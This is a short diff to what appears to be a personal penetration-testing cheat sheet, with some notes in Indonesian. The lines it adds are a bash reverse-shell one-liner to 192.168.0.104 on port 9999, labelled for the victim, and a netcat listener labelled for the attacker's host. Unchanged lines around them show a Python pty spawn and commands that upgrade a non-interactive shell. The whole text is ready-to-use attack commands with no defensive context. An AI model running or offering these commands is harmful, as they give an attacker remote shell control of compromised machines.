@@ -14,6 +14,14 @@ __interactive shell__
 
 (python -c "import pty;pty.spawn('/bin/sh')")
 
+__forwarding shell(victim)__
+
+(bash -i >& /dev/tcp/192.168.0.104/9999 0>&1)
+
+__forwarding shell(host)__
+
+(nc -lvnp 9999)
+
 __change from non interactive to interactive__
 
 (*echo $SHELL (variable yg dh diset)*echo $TERM*export SHELL=/bin/bash*export TERM=xterm-256color*stty -a*stty raw -a)
